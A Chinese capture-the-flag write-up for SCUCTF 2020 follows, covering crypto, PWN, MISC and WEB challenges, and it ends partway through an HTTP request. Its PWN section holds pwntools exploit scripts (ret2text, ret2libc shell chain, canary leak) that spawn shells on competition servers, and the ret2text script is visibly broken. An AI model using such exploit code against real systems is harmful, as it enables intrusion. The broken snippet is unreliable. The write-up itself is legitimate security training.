<h3 id="4-RSA-2"><a href="#4-RSA-2" class="headerlink" title="4.RSA_2"></a>4.RSA_2</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">c = <span class="hljs-number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span><br>n = <span class="hljs-number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span><br>e = <span class="hljs-number">0x10001</span><br><span class="hljs-comment"># e = 65,537</span><br></code></pre></div></td></tr></table></figure>
<p>对n进行分解,得到三个质因子</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa2.1.png" srcset="/img/loading.gif" lazyload></p>
<p>按照RSA加密原理进行解密,编写脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes, getPrime<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p1 = <span class="hljs-number">199045230832669039221046041578658179479</span><br>p2 = <span class="hljs-number">319438022064098846441615805897528174851</span><br>p3 = <span class="hljs-number">334688613728124045578795340681788885633</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span><br>n = <span class="hljs-number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span><br>fai = (p1 - <span class="hljs-number">1</span>) * (p2 - <span class="hljs-number">1</span>) * (p3 - <span class="hljs-number">1</span>)<br>d = inverse(e, fai)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>print(long_to_bytes(m))<br><span class="hljs-comment"># scuctf&#123;e063d03aff353073c24617bd4b483f90&#125;</span><br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="5-math-1"><a href="#5-math-1" class="headerlink" title="5.math_1"></a>5.math_1</h3><p>考察中国剩余定理,脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># prime_list = []</span><br><span class="hljs-comment"># i = 0</span><br><span class="hljs-comment"># while (i&lt;100):</span><br><span class="hljs-comment">#     p = getPrime(256)</span><br><span class="hljs-comment">#     if p not in prime_list:</span><br><span class="hljs-comment">#         prime_list.append(p)</span><br><span class="hljs-comment">#         i += 1</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># c_list = []</span><br><span class="hljs-comment"># i = 0</span><br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-comment">#     r = random.randint(1, prime_list[i])</span><br><span class="hljs-comment">#     c_list.append(r)</span><br><br>result = <span class="hljs-number">0</span><br>prime_list = [...]<br>c_list = [...]<br><br>x = <span class="hljs-number">0</span><br>m = <span class="hljs-number">1</span><br>MR = []<br>M = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    m *= prime_list[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    M.append(m // prime_list[i])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    MR.append(inverse((M[i]), prime_list[i]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    x += M[i] * MR[i] * c_list[i]<br>result = x % m<br>print(result)<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    f = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">if</span> result % prime_list[i] != c_list[i]:<br>            f = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> f == <span class="hljs-number">1</span>:<br>        print(<span class="hljs-string">&quot;flag is scuctf&#123;%d&#125;&quot;</span> % (result % <span class="hljs-number">1145141145141145141145141919810</span>))<br>        <span class="hljs-keyword">break</span><br>    result += <span class="hljs-number">1</span><br><span class="hljs-comment"># flag is scuctf&#123;234970795255267031279059393553&#125;</span><br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="6-RSA-3"><a href="#6-RSA-3" class="headerlink" title="6.RSA_3"></a>6.RSA_3</h3><p>本题与RSA_1一样,m=3,都是低加密指数攻击,使用脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: cp936 -*-</span><br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">3</span><br><span class="hljs-comment"># 读入 n, 密文</span><br>n= <span class="hljs-number">91271647735744709097708757371810693819959773890255602892321052899291140524662404139036987856738557165460502348870154514187118388083897953512262523467951513248663220055679646915049292032986252072883347567763269025940548912246834125522235064649335386094011441612211361270863086815851273615300955370973053395447</span><br>c= <span class="hljs-number">8473924177689385097361186953656797062650227841190040965380473377780644233766714939608585534305414668494659709275756172697799483669925043356688884324887478394528746881611781366747757023562008158800275672858865552852268001893</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n=&#x27;</span>, n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;c=&#x27;</span>, c<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+]Detecting m...&#x27;</span><br>result = gmpy2.iroot(c, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> result[<span class="hljs-number">1</span>]: <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The m is:&#x27;</span>, <span class="hljs-string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(result[<span class="hljs-number">0</span>]).decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[!]All Done!&#x27;</span><br></code></pre></div></td></tr></table></figure>
<p>得到flag:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa3.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="7-math-2"><a href="#7-math-2" class="headerlink" title="7.math_2"></a>7.math_2</h3><p>本题为求解二次剩余方程,谷歌后找到了一个脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">求解二次剩余的根</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_quadratic_field</span>(<span class="hljs-params">d, modulo=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Generate quadratic field number class</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        class -- quadratic field number class</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">isinstance</span>(modulo, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> modulo &gt;= <span class="hljs-number">0</span>)<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QuadraticFieldNumber</span>:</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, x, y</span>):</span><br>            self.x = x % modulo<br>            self.y = y % modulo<br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__mul__</span>(<span class="hljs-params">self, another</span>):</span><br>            x = self.x * another.x + d * self.y * another.y<br>            y = self.x * another.y + self.y * another.x<br>            <span class="hljs-keyword">return</span> self.__class__(x, y)<br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__pow__</span>(<span class="hljs-params">self, exponent</span>):</span><br>            result = self.__class__(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">if</span> exponent:<br>                temporary = self.__class__(self.x, self.y)<br>                <span class="hljs-keyword">while</span> exponent:<br>                    <span class="hljs-keyword">if</span> exponent &amp; <span class="hljs-number">1</span>:<br>                        result *= temporary<br>                    temporary *= temporary<br>                    exponent &gt;&gt;= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> result<br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span>(<span class="hljs-params">self</span>):</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;(&#123;&#125;, &#123;&#125; \\sqrt(&#123;&#125;))&#x27;</span>.<span class="hljs-built_in">format</span>(self.x, self.y, d)<br>    <span class="hljs-keyword">return</span> QuadraticFieldNumber<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">square_root_of_quadratic_residue</span>(<span class="hljs-params">n, modulo</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Square root of quadratic residue</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Solve the square root of quadratic residue using Cipolla&#x27;s algorithm with Legendre symbol</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        int -- if n is a quadratic residue,</span><br><span class="hljs-string">                   return x, such that x^&#123;2&#125; = n (mod modulo)</span><br><span class="hljs-string">               otherwise, return -1</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> modulo == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> n % modulo == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    Legendre = <span class="hljs-keyword">lambda</span> n: <span class="hljs-built_in">pow</span>(n, modulo - <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>, modulo)<br>    <span class="hljs-keyword">if</span> Legendre(n) == modulo - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> Legendre(t ** <span class="hljs-number">2</span> - n) != modulo - <span class="hljs-number">1</span>:<br>        t += <span class="hljs-number">1</span><br>    w = (t ** <span class="hljs-number">2</span> - n) % modulo<br>    <span class="hljs-keyword">return</span> (generate_quadratic_field(w, modulo)(t, <span class="hljs-number">1</span>) ** (modulo + <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>)).x<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    result = square_root_of_quadratic_residue(<span class="hljs-number">11451419198101926081719260817111</span>,<span class="hljs-number">8497980875583539713991243773941802042180496489377326522174599746685528850719812035800799014030522052269804143947777659192760008656733593814889715667890907</span>)<br>    print(result)<br>    print(<span class="hljs-string">&quot;flag is scuctf&#123;%d&#125;&quot;</span> % (result % <span class="hljs-number">1145141145141145141145141919810</span>))<br><span class="hljs-comment"># 732801025780658791900010899303199208933111943525875138490440727430546888153518985058336834409501987347490118623489611480915480075486097312160196897614257</span><br><span class="hljs-comment"># flag is scuctf&#123;362832854211699327118018596457&#125;</span><br></code></pre></div></td></tr></table></figure>

<hr>
<h3 id="8-baby-pad"><a href="#8-baby-pad" class="headerlink" title="8.baby_pad"></a>8.baby_pad</h3><p>观察pad方法和输出的密文,在pad函数在M后面加上了0x05个0x05,故先将cipher从十六进制字符串转转成字符串,然后使用切片切掉后5个字符得到M,再将M与key进行异或得到flag,编写脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>flag = <span class="hljs-string">b&#x27;???&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span>(<span class="hljs-params">M</span>):</span><br>    pad_length = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(M) % <span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> M.decode() + <span class="hljs-built_in">chr</span>(pad_length) * pad_length<br><br>key = <span class="hljs-string">b&#x27;x&#x27;</span> * <span class="hljs-built_in">len</span>(flag)<br>print(<span class="hljs-built_in">len</span>(flag))<br>cipher = pad(strxor(flag, key))<br>print(cipher.encode().<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># cipher = 0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505</span><br><br>res = <span class="hljs-string">&#x27;0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505&#x27;</span><br>s = <span class="hljs-built_in">bytes</span>.fromhex(res).decode()<br>print(<span class="hljs-built_in">len</span>(s))<br>t = s[:-<span class="hljs-number">5</span>].encode()<br>key1 = <span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-built_in">len</span>(t)<br>print(strxor(t,key1))<br><span class="hljs-comment"># b&#x27;scuctf&#123;easy_trickkkk&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure>


<hr>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-nc"><a href="#1-nc" class="headerlink" title="1.nc"></a>1.nc</h3><p>在linux终端 nc 121.196.34.30 10004</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/nc.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2.ret2text"></a>2.ret2text</h3><p>查看关键函数,可见s申请的空间为0x10:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.2.png" srcset="/img/loading.gif" lazyload></p>
<p>gdb调试查看偏移量,所以偏移量就是0x10:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.4.png" srcset="/img/loading.gif" lazyload></p>
<p>找到后门函数success的地址:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.3.png" srcset="/img/loading.gif" lazyload></p>
<p>编写exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./ret2text&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.196.34.30&#x27;</span>,<span class="hljs-string">&#x27;10007&#x27;</span>)<br>back_door = <span class="hljs-number">0x04007A5</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="raw"><a href="#raw" class="headerlink" title="raw"></a>raw</h2><h3 id="3-ret2libc"><a href="#3-ret2libc" class="headerlink" title="3.ret2libc"></a>3.ret2libc</h3><p>先查看保护情况:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.1.png" srcset="/img/loading.gif" lazyload></p>
<p>查看偏移量,故偏移量为buf申请的空间加上rbp的8个字节:0x70+0x08=120</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.2.png" srcset="/img/loading.gif" lazyload></p>
<p>因为是64位的程序,使用寄存器传递参数,通过pop指令来向寄存器中传值,查找rdi的地址</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.3.png" srcset="/img/loading.gif" lazyload></p>
<p>查看bin/sh的地址</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.4.png" srcset="/img/loading.gif" lazyload></p>
<p>查看system函数的地址</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.5.png" srcset="/img/loading.gif" lazyload></p>
<p>编写exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>sh = remote(<span class="hljs-string">&#x27;121.196.34.30&#x27;</span>,<span class="hljs-string">&#x27;10005&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">sh, payload</span>):</span><br>	sh.send(payload)<br>	sh.interactive()<br>    <br>system_addr = <span class="hljs-number">0x04006D0</span><br>pop_rdi_addr = <span class="hljs-number">0x04009f3</span><br>binsh_addr = <span class="hljs-number">0x0400A14</span> <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>* <span class="hljs-number">120</span> + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)<br>pwn(sh, payload) <br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="5-baby-canary"><a href="#5-baby-canary" class="headerlink" title="5.baby_canary"></a>5.baby_canary</h3><p>查看保护情况</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.1.png" srcset="/img/loading.gif" lazyload></p>
<p>可以知道v6就是canary,计算buf到v6的偏移量为0x28-0x18=24,还要覆盖rbp的0x08个字节</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.2.png" srcset="/img/loading.gif" lazyload></p>
<p>编写exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>path = <span class="hljs-string">&quot;/home/icey/canarys/canary&quot;</span><br><br>io = remote(<span class="hljs-string">&#x27;121.196.34.30&#x27;</span>,<span class="hljs-string">&#x27;10000&#x27;</span>)<br>get_shell = ELF(path).sym[<span class="hljs-string">&quot;success&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;length?\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;32&quot;</span>) <span class="hljs-comment"># 发送32(大于24小于32)通过验证,并可以使返回数据时不发生EOF异常</span><br>io.recvuntil(<span class="hljs-string">&quot;what?\n&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span><br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span>)<br><br>Canary = u64(io.recv(<span class="hljs-number">8</span>)) -<span class="hljs-number">0xa</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(get_shell)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>


<hr>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-easy-encode"><a href="#1-easy-encode" class="headerlink" title="1.easy_encode"></a>1.easy_encode</h3><p>仅有scu、401两种组成编码,猜测是摩斯密码 写程序输出摩斯密码格式:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>): <br>s = f.readline() <br>s = s.replace(<span class="hljs-string">&#x27;401&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-comment"># long </span><br>s = s.replace(<span class="hljs-string">&#x27;SCU&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>) <span class="hljs-comment"># short </span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) <br>s = s.replace(<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br><span class="hljs-built_in">print</span> s[:-<span class="hljs-number">1</span>]<br></code></pre></div></td></tr></table></figure>
<p>在线网站解密得到flag</p>
<hr>
<h3 id="2-excalibur"><a href="#2-excalibur" class="headerlink" title="2.excalibur"></a>2.excalibur</h3><p>java反编译,得到flag</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/misc/misc2.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="3-签到题"><a href="#3-签到题" class="headerlink" title="3.签到题"></a>3.签到题</h3><hr>
<h3 id="4-问卷"><a href="#4-问卷" class="headerlink" title="4.问卷"></a>4.问卷</h3><hr>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><hr>
<h3 id="1-真的是签到题"><a href="#1-真的是签到题" class="headerlink" title="1.真的是签到题"></a>1.真的是签到题</h3><p>保存图片就有flag</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/%E4%B8%8B%E8%BD%BD.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="2-情感日记"><a href="#2-情感日记" class="headerlink" title="2.情感日记"></a>2.情感日记</h3><p>一张张看,拼出flag</p>
<hr>
<h3 id="3-新生系列1-easyhtml"><a href="#3-新生系列1-easyhtml" class="headerlink" title="3.(新生系列1)easyhtml"></a>3.(新生系列1)easyhtml</h3><p>F12查看源代码,注释处就有flag</p>
<hr>
<h3 id="4-我爬我爬"><a href="#4-我爬我爬" class="headerlink" title="4.我爬我爬"></a>4.我爬我爬</h3><p>地址栏输入robots.txt跳转<br>发现ffflllaaaggg.html,输入后再跳转,base64解密得到flag</p>
<hr>
<h3 id="5-easyheehee"><a href="#5-easyheehee" class="headerlink" title="5.easyheehee"></a>5.easyheehee</h3><p>查看响应头,lookme=Wm1abWJHeHNZV0ZoWjJkbkxuQm9jQT09<br>两次base64解码得到ffflllggg.php,在地址栏访问即可获得flag</p>
<hr>
<h3 id="6-easyweb"><a href="#6-easyweb" class="headerlink" title="6.easyweb"></a>6.easyweb</h3><p>Burp抓包添加:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">121.89.162.165:8006</span><br><span class="hljs-attribute">User</span>-Agent: <span class="hljs-number">0</span>x<span class="hljs-number">401</span>Browser<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Cookie</span>: Hm_lvt_a<span class="hljs-number">7727</span>c<span class="hljs-number">1058</span>f<span class="hljs-number">4</span>f<span class="hljs-number">3</span>bf<span class="hljs-number">30026</span>a<span class="hljs-number">96</span>a<span class="hljs-number">53</span>ff<span 